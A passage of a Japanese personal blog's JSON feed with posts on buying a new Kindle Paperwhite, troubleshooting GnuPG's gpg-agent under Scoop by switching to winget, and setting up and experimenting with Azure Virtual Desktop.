GIGAZINE\n  Log4Shell Update: Severity Upgraded 3.7 -\u0026gt; 9.0 for Second log4j Vulnerability (CVE-2021-45046) | LunaSec\n  参考図書   Spring Data JPAプログラミング入門 溝口賢司 (著) 秀和システム 2017-08-03 (Release 2018-04-23) Kindle版 B07CKHR8C1 (ASIN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  JPA のお勉強用に購入。紙のほうはプレミアが付いてるっぽいが Kindle で買えるよ。固定レイアウトだからブラウザの Kindle Cloud Reader で読めるし。真面目に基本を押さえて書いていて分かりやすい。\nreviewed by Spiegel on 2021-08-26 (powered by PA-APIv5)\n   Effective Java 第3版 Joshua Bloch (著), 柴田 芳樹 (翻訳) 丸善出版 2018-10-30 単行本（ソフトカバー） 4621303252 (ASIN), 9784621303252 (EAN), 4621303252 (ISBN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  再勉強中。 Kindle 版のほうがちょっと安いが，勤務先でも使いたかったので紙の本にした。\nreviewed by Spiegel on 2021-03-17 (powered by PA-APIv5)\n   Spring Boot 2 入門: 基礎から実演まで Webアプリ開発入門 原田 けいと (著), 竹田 甘地 (著), Robert Segawa (著)  2020-05-22 (Release 2020-05-22) Kindle版 B0893LQ5KY (ASIN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  Spring Boot を勉強することになって急遽買った本。めっさ分かりやすかった。 PDF 版が欲しいくらい（笑）\nreviewed by Spiegel on 2021-06-13 (powered by PA-APIv5)\n   Java言語で学ぶデザインパターン入門第3版 結城 浩 (著) SBクリエイティブ 2021-11-12 (Release 2021-11-13) Kindle版 B09HK66P5X (ASIN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  なんと！ 結城浩さんのデザパタ本の第3版が出た。古典的なデザインパターン23個はそのままに，最近の Java の言語仕様に合わせてコードが一新されている。 reviewed by Spiegel on 2021-11-13 (powered by PA-APIv5)\n "
    },
    {
      "title": "Kindle Paperwhite を新調した",
      "section": "remark",
      "description": "今使ってる Kindle 端末のバッテリがヘタれてきたので買い替えた。",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/remark/2021/12/new-kindle-paperwhite/",
      "published": "2021-12-08T11:49:45+00:00",
      "update": "2021-12-08T12:02:36+00:00",
      "content": "夏くらいからかな。 愛用している Kindle 端末のバッテリがヘタれてきたみたいで，たかだか4,5日充電してない状態でバッテリが空になりそうになったのよ。\n「いつ買ったんだっけ」と過去記事を漁ったら今の端末を買ったのは5年も前だった。 そりゃあバッテリもヘタれるわ（笑） 故障もなく，よう保ったな。 偉い偉い。\nちうわけで，今年の自分宛てクリスマスプレゼントとして Kindle Paperwhite を新調することにした。\n一応 Black Friday だか Cyber Monday だかで安売りするのを待ってたんだけど，安くなったのはストレージが8GBモデルばっかり。 泣く泣く定価で買いましたよ。\n非接触充電スタンドとセットでちょびっと安くしてくれるみたいなのでセット買いしたんだけど，なんかバラバラで配送するとか言ってくさる。 いや，多少遅れてもまとめて来いよ。 充電スタンドだけ先に来てどうせぇっちうねん！\n充電スタンドのほうが先にくるとか... | Flickr  まぁ，そんなこんなであまり期待せず待っていたのだが，思いがけず本体が予定より1週間早く来ることになった。 いや，文句言ってごめんペコン。\n予定より1週間早く到着 | Flickr  早速開梱してセットアップ。 現在は充電中。\nセットアップ完了。非接触充電中 | Flickr  今度も長いお付き合いができますように。 バッテリがヘタれてる子はどうしよう\u0026hellip;\n参考   【NEWモデル】Kindle Paperwhite シグニチャー エディション (32GB) 6.8インチディスプレイ ワイヤレス充電対応 明るさ自動調節機能つき 広告なし Amazon (Release 2021-11-10) エレクトロニクス B08N2ZL7PS (ASIN), 0840080586151 (EAN), 840080586151 (UPC) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  前の端末のバッテリがヘタれたので新しいのを買った。安定のもっさり感（笑）\nreviewed by Spiegel on 2021-12-08 (powered by PA-APIv5)\n   新登場【Kindle Paperwhite シグニチャーエディション 2021年発売 第11世代専用】Anker ワイヤレス充電スタンド (Made for Amazon認定取得) Anker (Release 2021-12-01) 付属品 B09C49XNB8 (ASIN), 0194644076214 (EAN), 194644076214 (UPC) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  第11世代 Kindle Paperwhite とセットで購入。 ANKER 製らしい。\nreviewed by Spiegel on 2021-12-08 (powered by PA-APIv5)\n   【Kindle Paperwhite, Kindle Paperwhiteシグニチャーエディション用】 Amazon純正 ファブリックカバー、 ブラック (2021年発売 第11世代) Amazon (Release 2021-10-27) 付属品 B08VZCBWN8 (ASIN), 0840080522821 (EAN), 840080522821 (UPC) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  Kindle 端末とバッテリスタンドをセットで買ったら抱き合わせで勝手に付いてきた。要らんのに。\nreviewed by Spiegel on 2021-12-08 (powered by PA-APIv5)\n   著作権は文化を発展させるのか: 人権と文化コモンズ 山田 奨治 (著) 人文書院 2021-07-29 (Release 2021-07-29) Kindle版 B099RTG3J7 (ASIN)  2021年夏に出てたのだが，仕事が忙しくなってすっかり忘れていた。これから読みます。\nreviewed by Spiegel on 2021-12-06 (powered by PA-APIv5)\n "
    },
    {
      "title": "Scoop 版 GnuPG 2.3 系の gpg-agent が動かない？",
      "section": "remark",
      "description": "こういう調査を Azure Virtual Desktop でしたかったんだよね。",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/remark/2021/12/gpg-agent-for-windows/",
      "published": "2021-12-07T12:35:57+00:00",
      "update": "2021-12-07T12:40:30+00:00",
      "content": " ようやく Azure Virtual Desktop を導入できた Azure Virtual Desktop で遊ぶ Scoop 版 GnuPG 2.3 系の gpg-agent が動かない？ ← イマココ  今日も Azure Virtual Desktop で遊んでいるのだが，どうやら Scoop でインストールした 2.3 系 GnuPG で gpg-agent が上手く起動しないみたい。 厳密には GnuPG v2.3.2 以降。\n実は仕事用の Windows マシンでは随分前から気がついていたが，忙しくて碌に検証もできなかったのだ1。 今回の真っさら Windows で試してみて「やっぱ動かんぢゃん！」ってなった。\n詳しく言うと\n$ gpg-connect-agent /bye gpg-connect-agent: gpg-agentが動いていません - 開始します\u0026#39;C:\\\\Users\\\\username\\\\scoop\\\\apps\\\\gnupg\\\\current\\\\bin\\\\gpg-agent.exe\u0026#39; gpg-connect-agent: agent の起動のため、5秒待ちます... gpg-connect-agent: agent の起動のため、4秒待ちます... gpg-connect-agent: agent の起動のため、3秒待ちます... gpg-connect-agent: agent の起動のため、2秒待ちます... gpg-connect-agent: agent の起動のため、1秒待ちます... gpg-connect-agent: can\u0026#39;t connect to the gpg-agent: IPC connect呼び出しに失敗しました gpg-connect-agent: 標準オプションを送信エラー: エージェントが動いていません という感じに gpg-agent を起動しようとするも，5秒でタイムアウトになって失敗する。 v2.3.1 に戻すと動くので v2.3.2 で何かあったんだろう。\nv2.3.2 の変更点を眺めると\n Under Windows use LOCAL_APPDATA for the socket directory. [#5537]   via GnuPG 2.3.2 released  とある。 どうもこれっぽい。 でも gpgconf で見ると\n$ gpgconf --list-dirs | grep socket socketdir:C%3a\\Users\\username\\scoop\\apps\\gnupg\\current\\gnupg dirmngr-socket:C%3a\\Users\\username\\scoop\\apps\\gnupg\\current\\gnupg\\S.dirmngr keyboxd-socket:C%3a\\Users\\username\\scoop\\apps\\gnupg\\current\\gnupg\\S.keyboxd agent-ssh-socket:C%3a\\Users\\username\\scoop\\apps\\gnupg\\current\\gnupg\\S.gpg-agent.ssh agent-extra-socket:C%3a\\Users\\username\\scoop\\apps\\gnupg\\current\\gnupg\\S.gpg-agent.extra agent-browser-socket:C%3a\\Users\\username\\scoop\\apps\\gnupg\\current\\gnupg\\S.gpg-agent.browser agent-socket:C%3a\\Users\\username\\scoop\\apps\\gnupg\\current\\gnupg\\S.gpg-agent てな感じで，ちゃんと Scoop 配下で設定されてるんだけどねぇ。\nwinget 版 GnuPG を導入する まぁ，愚痴ってもしょうがないので，とりあえず Scoop 版は諦めることにしよう。 幸いなことに winget でも GnuPG をインストール可能で，こちらは標準のインストーラが動くようだ。\n$ winget search gnupg 名前 ID バージョン ソース -------------------------------------------------- GNU Privacy Guard GnuPG.GnuPG 2.3.3 winget Gpg4win GnuPG.Gpg4win 3.1.16 winget というわけでインストールしてしまおう。\n$ winget install GnuPG.GnuPG 見つかりました GNU Privacy Guard [GnuPG.GnuPG] バージョン 2.3.3 このアプリケーションは所有者からライセンス供与されます。 Microsoft はサードパーティのパッケージに対して責任を負わず、ライセンスも付与しません。 Downloading https://gnupg.org/ftp/gcrypt/binary/gnupg-w32-2.3.3_20211012.exe ██████████████████████████████ 4.59 MB / 4.59 MB インストーラーハッシュが正常に検証されました パッケージのインストールを開始しています... インストールが完了しました $ gpg --version gpg (GnuPG) 2.3.3 libgcrypt 1.9.4 Copyright (C) 2021 g10 Code GmbH License GNU GPL-3.0-or-later \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Home: C:\\Users\\username\\AppData\\Roaming\\gnupg サポートしているアルゴリズム: 公開鍵: RSA, ELG, DSA, ECDH, ECDSA, EDDSA 暗号方式: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH, CAMELLIA128, CAMELLIA192, CAMELLIA256 AEAD: EAX, OCB ハッシュ: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224 圧縮: 無圧縮, ZIP, ZLIB, BZIP2 $ which gpg.exe C:\\Program Files (x86)\\gnupg\\bin\\gpg.exe $ gpgconf --list-dirs | grep socket socketdir:C%3a\\Users\\username\\AppData\\Local\\gnupg dirmngr-socket:C%3a\\Users\\username\\AppData\\Local\\gnupg\\S.dirmngr keyboxd-socket:C%3a\\Users\\username\\AppData\\Local\\gnupg\\S.keyboxd agent-ssh-socket:C%3a\\Users\\username\\AppData\\Local\\gnupg\\S.gpg-agent.ssh agent-extra-socket:C%3a\\Users\\username\\AppData\\Local\\gnupg\\S.gpg-agent.extra agent-browser-socket:C%3a\\Users\\username\\AppData\\Local\\gnupg\\S.gpg-agent.browser agent-socket:C%3a\\Users\\username\\AppData\\Local\\gnupg\\S.gpg-agent $ gpg-connect-agent /bye gpg-connect-agent: gpg-agentが動いていません - 開始します\u0026#39;C:\\\\Program Files (x86)\\\\gnupg\\\\bin\\\\gpg-agent.exe\u0026#39; gpg-connect-agent: agent の起動のため、5秒待ちます... gpg-connect-agent: agentへの接続が確立しました よーし，うむうむ，よーし。\nこういう調査を Azure Virtual Desktop でしたかったんだよね。 最悪コワしても仮想マシンを作り直せばいいんだし。\nさて GnuPG の導入で思いのほか手こずったので git 環境の整備は次回だな（笑）\nブックマーク  GnuPG の HOME はどこにある？  参考図書   暗号化 プライバシーを救った反乱者たち スティーブン・レビー (著), 斉藤 隆央 (翻訳) 紀伊國屋書店 2002-02-16 単行本 4314009071 (ASIN), 9784314009072 (EAN), 4314009071 (ISBN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  20世紀末，暗号技術の世界で何があったのか。知りたかったらこちらを読むべし！\nreviewed by Spiegel on 2015-03-09 (powered by PA-APIv5)\n   暗号技術入門 第3版　秘密の国のアリス 結城 浩 (著) SBクリエイティブ 2015-08-25 (Release 2015-09-17) Kindle版 B015643CPE (ASIN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  SHA-3 や Bitcoin/Blockchain など新しい知見や技術要素を大幅追加。暗号技術を使うだけならこれ1冊でとりあえず無問題。\nreviewed by Spiegel on 2015-09-20 (powered by PA-APIv5)\n   2.3系では特にセキュリティ・アップデートは発生していないので「後回しでいっか」と思っていた。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   "
    },
    {
      "title": "Azure Virtual Desktop で遊ぶ",
      "section": "remark",
      "description": "Tailscale で NAS とも繋がった。",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/remark/2021/12/azure-virtual-desktop-2/",
      "published": "2021-12-06T13:15:10+00:00",
      "update": "2021-12-07T12:40:30+00:00",
      "content": "目次を付けた。\n ようやく Azure Virtual Desktop を導入できた Azure Virtual Desktop で遊ぶ ← イマココ Scoop 版 GnuPG 2.3 系の gpg-agent が動かない？  前回でようやく Azure Virtual Desktop が導入できたので，これを使って Windows でボチボチ遊んでいこう。\nとりあえず Scoop と NYAGOS は入れておく なにはともあれ Scoop と NYAGOS は入れておかないとね。\n scoop / nyagos で始めるコマンドライン生活  この辺は問題なし。\nwinget を試してみる winget は Microsoft 公式のアプリケーション・パッケージ・マネージャで，たぶん Chocolatey あたりと置き換えて使えるように構成されていると思われる。\n microsoft/winget-cli: Windows Package Manager CLI (aka winget) winget ツールを使用したアプリケーションのインストールと管理 | Microsoft Docs  せっかく真っサラな環境が手に入ったんだから winget を試してみるとしよう。 と思ったが，最近の Windows には最初から入ってるのね。\n$ winget -v v1.1.12986 ない場合は Microsoft Store から入れるのがいいようだ。 以下の「アプリ インストーラー」を入れる。\n とりあえず git があるか検索してみよう。\n$ winget search git \u0026#39;msstore\u0026#39; ソースを使用するには、使用する前に次の契約を表示する必要があります。 Terms of Transaction: https://aka.ms/microsoft-store-terms-of-transaction ソースが正しく機能するには、現在のマシンの地域を送信する必要があります。 すべてのソース契約条件に同意しますか? [Y] はい [N] いいえ: おうふ。 まぁ，いいか。 [Y] キー押下で先に進む。\n名前 ID バージョン 一致 ソース ------------------------------------------------------------------------------------------------------- My Git 9NLVK2SL2SSP Unknown msstore GitFiend 9NMNKLTSZNKC Unknown msstore GitCup 9NBLGGH4XFHP Unknown msstore GitVine 9P3BLC2GW78W Unknown msstore GitIt 9NBLGGH40HV7 Unknown msstore GitHub Zen 9NBLGGH4RTK3 Unknown msstore GitLooker 9PK6TGX9T87P Unknown msstore Git Git.Git 2.34.1 winget GitNote zhaopengme.gitnote 3.1.0 Tag: git winget Agent Git Xidicone.AgentGit 1.85 Tag: Git winget TortoiseSVN TortoiseSVN.TortoiseSVN 1.14.29085 Tag: git winget TortoiseGit TortoiseGit.TortoiseGit 2.12.0.0 Tag: git winget Sublime Merge (Dev) SublimeHQ.SublimeMerge.Dev 2057 Tag: git winget Sublime Merge SublimeHQ.SublimeMerge 2063 Tag: git winget Git Credential Manager Core Microsoft.GitCredentialManagerCore 2.0.567.18224 Tag: git winget glab GLab.GLab 1.21.1 Tag: git winget Git LFS GitHub.GitLFS 3.0.2 Tag: git winget GitHub Desktop GitHub.GitHubDesktop 2.9.5 Tag: git winget Git Extensions GitExtensionsTeam.GitExtensions 3.5.4.12724 Tag: git winget Fork - a fast and friendly git client Fork.Fork 1.69.4 Tag: git winget GitKraken Axosoft.GitKraken 8.1.1 Tag: git winget Sourcetree Atlassian.Sourcetree 3.4.7 Tag: git winget Gource acaudwell.Gource 0.51 Tag: git winget DevSidecar docmirror.dev-sidecar 1.7.1 Tag: git winget GitFiend TobySuggate.GitFiend 0.28.0 winget Snagit TechSmith.Snagit 21.4.4.12541 winget GitHubReleaseNotes StefHeyenrath.GitHubReleaseNotes 1.0.7.1 winget GitBlade PirinelLtd.GitBlade 00.00.8.9 winget GVFS Microsoft.VFSforGit 1.0.21229.1 winget Microsoft Git Microsoft.Git 2.33.0.0.3 winget Gitify manosim.gitify 4.3.1 winget Logitech Unifying Software Logitech.UnifyingSoftware 2.50.25 winget Logitech Solar App Logitech.Solar 1.20.28 winget Logitech SetPoint Logitech.SetPoint 6.70.55 winget Logitech Options Logitech.Options 9.40.86 winget Logitech Gaming Software Logitech.LGS 9.02.65 winget Logitech Camera Settings Logitech.CameraSettings 2.12.8.0 winget AnimeBack LeGitHubDeTai.AnimeBack 8.0.8 winget gitg gnome.gitg 3.32.1 winget Thermal gitthermal.thermal 0.0.4 winget eDEX-UI GitSquared.edex-ui 2.2.8 winget Gitter Gitlab.Gitter 5.0.1 winget GitHub CLI GitHub.cli 2.3.0 winget classroom-assistant GitHub.ClassroomAssistant 2.0.4 winget Atom Beta GitHub.Atom.Beta 1.59.0-beta0 winget Atom GitHub.Atom 1.58.0 winget GitAhead GitAhead.GitAhead 2.6.3 winget MaxTo DigitalCreations.MaxTo 2.2.1 winget APDigitalExams CollegeBoard.APDigitalExams 0.9.1 winget 2021 Digital AP Exams CollegeBoard.2021DigitalAPExams 0.9.4.5 winget Fundels CartamundiDigital.Fundels 3.0.10 winget Logi Tune Logitech.LogiTune 2.206.12.0 winget Duplicate Cleaner Free DigitalVolcanoSoftware.DuplicateC… 4.1.2 winget Duplicate Cleaner Pro DigitalVolcanoSoftware.DuplicateC… 4.1.4 winget GitHub Desktop Beta GitHub.GitHubDesktop.Beta 2.9.3-beta1 winget Logitech G HUB Logitech.GHUB 2021.3.9205 winget GetData Graph Digitizer getdata.getdata 2.26 winget Renoise Renoise.Renoise 3.3.2 Tag: di… winget Cacher PenguinLabs.Cacher 2.42.2 Tag: gi… winget AppInstaller File Builder(Preview) Microsoft.AppInstallerFileBuilder 1.2020.221.0 Tag: Gi… winget FL Studio ImageLine.FLStudio 20.8.3.2304 Tag: di… winget Gridea getgridea.gridea 0.9.2 Tag: gi… winget MarkRight dvcrn.markright 0.1.11 Tag: gi… winget Dolt DoltHub.Dolt 0.34.7 Tag: gi… winget DAWG dawg.dawg 0.2.3 Tag: di… winget REAPER Cockos.REAPER 6.42 Tag: di… winget CloudShow Launcher BinaryFortress.CloudShow 5.7.3.0 Tag: di… winget Lepton hackjutsu.Lepton 1.10.0 Tag: Gi… winget Monkey\u0026#39;s Audio MonkeysAudio.MonkeysAudio 7.20 Tag: di… winget 多いわ！ どんだけ引っかかるねん。\nまぁ，ともかく， git のバージョンは最新ぽいな。 Git Extensions も最新かな。 PuTTY はどうだろう。\n$ winget search putty 名前 ID バージョン 一致 ソース ------------------------------------------------------------------------------ Metro PuTTY 9WZDNCRDNDFH Unknown msstore Putty (Unofficial) 9N8PDN6KS0F8 Unknown msstore PuTTY PuTTY.PuTTY 0.76.0.0 winget MTPuTTY TTYPlus.MTPutty 1.8 Tag: putty winget NETworkManager BornToBeRoot.NETworkManager 2021.11.30.0 Tag: putty winget PortX NetSarangComputer.PortX 2.0.3 Tag: putty winget PuTTY.PuTTY なら大丈夫かな。 なんかノイズが多いなぁ。 winget でパッケージを探すのは向いてないかも。\nおっ， KeePassXC は winget で入れれるようだ。\n$ winget install keepassxc ものによって Scoop と winget で使い分ければいいかもな。\nストアアプリ版「秀丸」 いつまでも「メモ帳」なわけにもいかないが Web クライアント越しに VS Code はたぶん辛いので vim あたりを突っ込んでおきたいところだ。\nvim のインストールは Scoop で可能。\nでも GUI も欲しいよね。 というわけで，かつて20年はお世話になった「秀丸」を入れようと思う。\n 秀まるおのホームページ(サイトー企画)－秀丸エディタ(ストアアプリ版)  ふむむ。 ストアアプリ版は別ライセンスで Microsoft アカウント単位でお金を払えばいいのか。 Microsoft アカウントに紐付いている決済手段が使えるので楽っちゃあ楽。\nというわけで4K円ほど払い込みました。\n v9.00 じゃないのか。 残念（笑）\nおそらく「どこでもエディタ」をヘヴィに使いたいなら，こんな仮想マシンを用意するのではなく GitHub Codespaces や vscode.dev を使えっちう話なんよね。\n時代は変わっていく。\nTailscale で NAS につなぐ さて，いよいよ外と繋ぐことにする。 といっても外部から Azure Virtual Desktop 内のリソースに触る気はないので Azure Virtual Desktop 側から Tailscale で自宅 NAS に繋ぐことを考える。\nWindows 版 Tailscale は winget でインストールできる。\n$ winget search tailscale 名前 ID バージョン ソース ------------------------------------------------ Tailscale tailscale.tailscale 1.18.0 winget バージョンも問題なさそうだな。\nインストールしたら仮想デスクトップから Tailscale にログインすれば OK。 Tailscale が指定した IP アドレスで NAS に入れることを確認できた。\n簡単簡単。 やっぱマシン同士を peer に繋げられるのはいいわ。\nというわけで NAS とも繋がったので，更にいろいろ遊べるようになった。\nブックマーク  アプリのインストールや更新をコマンドでサクっと実行「winget」の使い方：Windows 10 The Latest - ＠IT wingetを使おう 前編：wingetのインストールと基本操作 | AsTechLog   マイクロソフト、WebIDEの「Visual Studio Codespaecs」を「GitHub Codespaces」に統合へ － Publickey   「GitHub Codespaces」が法人向けに提供開始 ～［.］キーでリポジトリを「Visual Studio Code」開くショートカットも - 窓の杜 Github CodeSpace 触ってみた - Qiita Webブラウザーで「Visual Studio Code」が完全動作 ～「vscode.dev」にアクセスするだけ - 窓の杜  "
    },
    {
      "title": "ようやく Azure Virtual Desktop を導入できた",
      "section": "remark",
      "description": "最初の頃はデプロイが失敗しまくりで往生したですよ。",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/remark/2021/12/azure-virtual-desktop/",
      "published": "2021-12-05T14:16:02+00:00",
      "update": "2021-12-07T12:40:30+00:00",
      "content": "目次を付けた。\n ようやく Azure Virtual Desktop を導入できた ← イマココ Azure Virtual Desktop で遊ぶ Scoop 版 GnuPG 2.3 系の gpg-agent が動かない？  よーやく Azure Virtual Desktop を導入できたよ。 Windows 11 が使えるということで個人用の Azure アカウントで試そうとしたんだけど，何だか情報が断片的で分かりにくくてさ。\n手順を覚えているうちに覚え書きとして残しておく。 なお，法人ユーザの場合は Windows 365 のほうがオススメである。 今回はあくまで個人ユーザの場合ね。\nAzure Active Directory を確認する 個人で Azure アカウントをとった場合でもフリー版の Azure Active Directory が用意されている。 Azure Virtual Desktop を構成するためには Azure Active Directory をチェックしてユーザ・プリンシパル名（User Principal Name; UPN）を確認してサインイン可能にしておく必要がある。\n注意しないといけないのは Azure アカウントを取得したときのアカウント名と UPN が異なっている（場合がある）という点。 これに気が付かなくてしーばらく悩んだよ。\nAzure Virtual Network を構成する Azure Virtual Desktop を構成する際に Azure Virtual Network を指定する必要がある。 これも気が付かなくて，何度もやり直す羽目になった。 Microsoft Docs には色々書かれているが，単純に Azure Virtual Desktop を使いたいだけなら BastionHost も Firewall も不要である1。\n クイック スタート: 仮想ネットワークを作成する - Azure portal - Azure Virtual Network | Microsoft Docs  ホストプールを先に作る さて，いよいよ Azure Virtual Desktop の作成を始めるのだが\n 「作業の開始」ではなく「ホスト プールの作成」から始めるとよい。 この中で「ホストプール」「仮想マシン」「ワークスペース」を決めていくのが効率がいいようだ。 最初の頃は「作業の開始」から始めて，どうやってもデプロイが失敗するので往生したですよ。\nなお，ホストプールだけ先に作っておいて仮想デスクトップとワークスペースは後から追加する手もある。 私は仮想デスクトップを試行錯誤でいくつか潰してしまった（笑）\n仮想デスクトップを構成する際に\n てな感じに「仮想マシンの管理者アカウント」を決めるのだが，この情報はどこかに控えておくこと。 最初に仮想デスクトップにログインする際はこの管理者アカウント情報が必要になる。 いや，うっかりアカウント情報を紛失しまって仮想デスクトップを無駄にしてしまったのよ2。\nなお，仮想デスクトップを追加する際にはホストプールの「セッション ホスト」で「追加」すればよい。\nところで，作成した仮想デスクトップを見ると\n ってなってるんだけど Windows 11 って 10 のバリエーションってことでOK？\n作成した仮想デスクトップに対して Azure Active Directory のユーザを割り当てる。 基本的にひとつの仮想デスクトップに対して1ユーザを割り当てる。\n Azure Virtual Desktop の個人用デスクトップの割り当ての種類 - Azure | Microsoft Docs  ちゃんと割り当てておかないとログイン時に割り当てられたリソースがないって怒られる。\nWeb クライアントで接続する 作成した仮想デスクトップにつなぐには各種クライアント・ツールが使えるのだが\n Azure Virtual Desktop のユーザー ドキュメント | Microsoft Docs  Linux 環境では Web クライアントを使うしかないみたい。\n Web クライアントを使用して Azure Virtual Desktop に接続する - Azure | Microsoft Docs  接続先は「Azure Resource Manager 統合バージョンの Azure Virtual Desktop Web クライアント」でいいようだ。 サインインは仮想デスクトップを割り当ててている Azure Active Directory の UNP でおこなう。 以下の画面が表示されればサインイン成功。\n “SessionDesktop” を選択すると\n などとプロンプトが出るので適当に「許可」するとようやく\n ログイン画面になる。 ここで「仮想マシンの管理者アカウント」を使ってログインすればよい。\n よーし。 よーやくここまできたよ。\n試しに Edge ブラウザで Google のページを開いてみる。\n おー。 これが噂のブラウザ勧誘合戦か。 アホだ（笑）\nというわけで，やっと Windows 11 で遊び倒す準備ができた。 まずは大量の Windows Update をどうにかしないと（笑）\nちなみにめちゃめちゃ重い。 普段遣いにはできないな，これ。\nAzure Virtual Desktop のコスト 2021-12-31 までは無料で Azure Virtual Desktop を利用できる。 以降については以下のサイトが参考になるかな。\n Azure Virtual Desktop の価格 | Microsoft Azure Azure Virtual Desktop のデプロイ コストの合計について - Azure | Microsoft Docs    仮想マシン間でやり取りしたいなら BastionHost を設定したほうがいいかも。外部から SSH で入る場合も必要かな。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n 仮想デスクトップのアカウント名だけでも分かっていれば Azure 側からパスワードリセットすることは可能。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   "
    }
  ]
}
